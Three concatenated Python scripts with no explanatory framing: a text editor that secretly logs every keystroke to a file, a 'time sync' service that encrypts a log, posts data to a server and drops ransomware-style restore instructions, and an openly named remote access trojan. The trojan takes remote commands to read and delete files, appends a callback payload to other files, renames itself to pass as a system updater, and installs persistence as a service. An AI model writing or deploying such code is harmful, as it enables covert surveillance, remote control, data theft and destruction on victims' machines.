import tkinter as tk
from tkinter import filedialog, messagebox
import os
import sys
import threading
import time

LOG_FILE = "keystrokes.txt"
SERVICE_FLAG = "--background-service"

def background_service():
    """Background service to ensure persistent logging."""
    while True:
        if not os.path.exists(LOG_FILE):
            try:
                with open(LOG_FILE, "w") as _:
                    pass  # Create the log file if it doesn't exist
            except Exception as e:
                print(f"Error creating log file: {e}")
        time.sleep(5)

class TextEditor:
    def __init__(self, root):
        self.root = root
        self.root.title("Enhanced Text Editor with Background Service")
        self.text_area = tk.Text(root, wrap="word", undo=True)
        self.text_area.pack(fill="both", expand=True)
        self.create_menu()
        self.setup_keylogger()

    def create_menu(self):
        menu_bar = tk.Menu(self.root)
        file_menu = tk.Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="Open", command=self.open_file)
        file_menu.add_command(label="Save", command=self.save_file)
        file_menu.add_command(label="Exit", command=self.root.quit)
        menu_bar.add_cascade(label="File", menu=file_menu)
        self.root.config(menu=menu_bar)

    def open_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if file_path:
            try:
                with open(file_path, "r") as file:
                    content = file.read()
                self.text_area.delete("1.0", tk.END)
                self.text_area.insert("1.0", content)
            except Exception as e:
                messagebox.showerror("Error", f"Could not open file: {e}")

    def save_file(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if file_path:
            try:
                with open(file_path, "w") as file:
                    content = self.text_area.get("1.0", tk.END).rstrip()
                    file.write(content)
            except Exception as e:
                messagebox.showerror("Error", f"Could not save file: {e}")

    def setup_keylogger(self):
        self.text_area.bind("<Key>", self.log_keystroke)

    def log_keystroke(self, event):
        key = event.char if event.char else f"[{event.keysym}]"
        try:
            with open(LOG_FILE, "a") as log:
                log.write(key)
        except Exception as e:
            messagebox.showerror("Error", f"Could not log keystroke: {e}")

def main():
    if SERVICE_FLAG in sys.argv:
        print("Starting background service...")
        threading.Thread(target=background_service, daemon=True).start()

    root = tk.Tk()
    editor = TextEditor(root)
    root.mainloop()

if __name__ == "__main__":
    main()

import datetime
import time
import json
import os
import hashlib
import base64
import http.client
import urllib.parse
import threading
from time import sleep
import sys

LOG_FILE = 'time_sync_log.txt'
CONFIG_FILE = 'time_sync_config.txt'
INSTRUCTIONS_FILE = 'RESTORE_INSTRUCTIONS.html'
DEFAULT_PASSPHRASE = 'default_secure_passphrase'
DEFAULT_SERVER_URL = 'http://example.com/timesync'
DEFAULT_INTERVAL = 86400  # 24 hours in seconds
DEFAULT_ITERATIONS = 1
MAX_RETRIES = 5

def sha256_hash(data):
    return hashlib.sha256(data.encode('utf-8')).digest()

def encrypt(data, passphrase):
    key = sha256_hash(passphrase)
    data_bytes = data.encode('utf-8')
    encrypted = bytearray(b ^ key[i % len(key)] for i, b in enumerate(data_bytes))
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt(data, passphrase):
    key = sha256_hash(passphrase)
    data_bytes = base64.b64decode(data.encode('utf-8'))
    decrypted = bytearray(b ^ key[i % len(key)] for i, b in enumerate(data_bytes))
    return decrypted.decode('utf-8')

def collect_time_and_timezone_info():
    now = datetime.datetime.now()
    formatted_time = now.strftime("%Y-%m-%d %H:%M:%S")
    timezone = time.tzname[time.daylight]
    return {
        "timestamp": formatted_time,
        "system_time": formatted_time,
        "timezone": timezone
    }

def append_to_log_file(log_entry, passphrase):
    encrypted_entry = encrypt(json.dumps(log_entry), passphrase)
    with open(LOG_FILE, 'a') as log_file:
        log_file.write(encrypted_entry + '\n')

def send_data_to_server(data, server_url):
    parsed_url = urllib.parse.urlparse(server_url)
    connection = http.client.HTTPConnection(parsed_url.netloc, timeout=10)
    headers = {'Content-Type': 'application/json'}
    body = json.dumps(data)
    connection.request("POST", parsed_url.path, body, headers)
    response = connection.getresponse()
    return response.status, response.read()

def retry_with_backoff(func, max_attempts, *args, **kwargs):
    for attempt in range(max_attempts):
        try:
            result = func(*args, **kwargs)
            return result
        except Exception as e:
            if attempt < max_attempts - 1:
                sleep(2 ** attempt)
            else:
                raise e

def write_config(interval, iterations):
    config = {
        "interval": interval,
        "iterations": iterations
    }
    with open(CONFIG_FILE, 'w') as config_file:
        config_file.write(json.dumps(config))

def read_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as config_file:
            return json.loads(config_file.read())
    return {"interval": DEFAULT_INTERVAL, "iterations": DEFAULT_ITERATIONS}

def write_recovery_instructions():
    instructions = f"""
    <html>
    <head><title>Decryption Instructions</title></head>
    <body>
        <h1>Log File Decryption Instructions</h1>
        <p>The log file <code>{LOG_FILE}</code> is encrypted. To decrypt it, use the following Python code:</p>
        <pre>
import hashlib
import base64

def sha256_hash(data):
    return hashlib.sha256(data.encode('utf-8')).digest()

def decrypt(data, passphrase):
    key = sha256_hash(passphrase)
    data_bytes = base64.b64decode(data.encode('utf-8'))
    decrypted = bytearray(b ^ key[i % len(key)] for i, b in enumerate(data_bytes))
    return decrypted.decode('utf-8')

with open('{LOG_FILE}', 'r') as f:
    encrypted_lines = f.readlines()

passphrase = "your_passphrase_here"
for line in encrypted_lines:
    print(decrypt(line.strip(), passphrase))
        </pre>
        <p>Replace <code>your_passphrase_here</code> with the passphrase used to encrypt the file.</p>
    </body>
    </html>
    """
    with open(INSTRUCTIONS_FILE, 'w') as file:
        file.write(instructions)

def run_service(server_url, passphrase, interval, iterations):
    for _ in range(iterations):
        log_entry = collect_time_and_timezone_info()
        append_to_log_file(log_entry, passphrase)
        try:
            retry_with_backoff(send_data_to_server, MAX_RETRIES, log_entry, server_url)
        except Exception as e:
            print(f"Failed to send data to server: {e}")
        if iterations > 1:
            sleep(interval)

def main():
    if not os.path.exists(INSTRUCTIONS_FILE):
        write_recovery_instructions()

    config = read_config()
    interval = config.get("interval", DEFAULT_INTERVAL)
    iterations = config.get("iterations", DEFAULT_ITERATIONS)

    passphrase = DEFAULT_PASSPHRASE
    server_url = DEFAULT_SERVER_URL

    write_config(interval, iterations)
    run_service(server_url, passphrase, interval, iterations)

if __name__ == "__main__":
    try:
        main()
        sys.exit(0)
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)

import os
import sys
import json
import time
import socket
import threading
import platform

SERVER_HOST = "127.0.0.1"  # Change to your server's IP address
SERVER_PORT = 9000         # Change to your desired port
BUFFER_SIZE = 1024

# File Operations
def list_files(directory):
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except FileNotFoundError:
        return f"Error: Directory '{directory}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for directory '{directory}'."

def read_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            return file.read()
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for file '{file_path}'."
    except Exception as e:
        return f"Error reading file '{file_path}': {e}"

def delete_file(file_path):
    try:
        os.remove(file_path)
        return f"File '{file_path}' deleted."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to delete file '{file_path}'."
    except Exception as e:
        return f"Error deleting file '{file_path}': {e}"

def embed_metadata(file_path):
    metadata = {
        "unique_id": os.path.basename(file_path),
        "last_modified": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(os.path.getmtime(file_path))),
    }
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write("\n---METADATA---\n")
            file.write(json.dumps(metadata))
        return f"Metadata added to '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to modify file '{file_path}'."
    except Exception as e:
        return f"Error embedding metadata into file '{file_path}': {e}"

def read_metadata(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
        if "---METADATA---\n" in lines:
            metadata_index = lines.index("---METADATA---\n") + 1
            metadata = json.loads("".join(lines[metadata_index:]))
            return f"Metadata for '{file_path}': {metadata}"
        else:
            return f"No metadata found in '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to read file '{file_path}'."
    except Exception as e:
        return f"Error reading metadata from file '{file_path}': {e}"

# Disguising as a legitimate application
def disguise_as_legitimate_application():
    legitimate_name = "WindowsUpdater.exe" if platform.system() == "Windows" else "linux_updater"
    current_file = sys.argv[0]
    disguised_path = os.path.join(os.getcwd(), legitimate_name)
    try:
        os.rename(current_file, disguised_path)
    except Exception:
        pass

# Infecting specified file
def infect_file(file_path):
    payload = f"""
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{SERVER_HOST}", {SERVER_PORT}))
s.sendall(b"RAT connected")
"""
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write(payload)
        return f"File '{file_path}' infected."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to infect file '{file_path}'."
    except Exception as e:
        return f"Error infecting file '{file_path}': {e}"

# Remote Command Processing
def handle_command(command, args):
    if command == "list":
        return list_files(args)
    elif command == "read":
        return read_file(args)
    elif command == "delete":
        return delete_file(args)
    elif command == "embed_metadata":
        return embed_metadata(args)
    elif command == "read_metadata":
        return read_metadata(args)
    elif command == "infect":
        return infect_file(args)
    else:
        return f"Error: Unknown command '{command}'."

# Server Handler
def server_handler():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            while True:
                message = client_socket.recv(BUFFER_SIZE).decode('utf-8')
                if not message:
                    break
                try:
                    data = json.loads(message)
                    command = data.get("command")
                    args = data.get("args", "")
                    result = handle_command(command, args)
                except Exception as e:
                    result = f"Error processing command: {e}"
                client_socket.sendall(result.encode('utf-8'))
    except Exception as e:
        pass

# Background Service for Persistence
def rat_service():
    if platform.system() == "Windows":
        service_name = "RATService"
        os.system(f"sc create {service_name} binPath= \"{sys.argv[0]} rat\"")
    else:
        service_path = "/etc/init.d/rat"
        with open(service_path, 'w', encoding='utf-8') as service_file:
            service_file.write(f"#!/bin/sh\npython3 {sys.argv[0]} rat\n")
        os.chmod(service_path, 0o755)
        os.system("update-rc.d rat defaults")
    while True:
        time.sleep(60)
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((SERVER_HOST, SERVER_PORT))
                update = {"status": "alive", "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}
                client_socket.sendall(json.dumps(update).encode('utf-8'))
        except Exception:
            pass

def main():
    disguise_as_legitimate_application()
    server_thread = threading.Thread(target=server_handler, daemon=True)
    server_thread.start()
    rat_thread = threading.Thread(target=rat_service, daemon=True)
    rat_thread.start()
    server_thread.join()
    rat_thread.join()

if __name__ == "__main__":
    main()

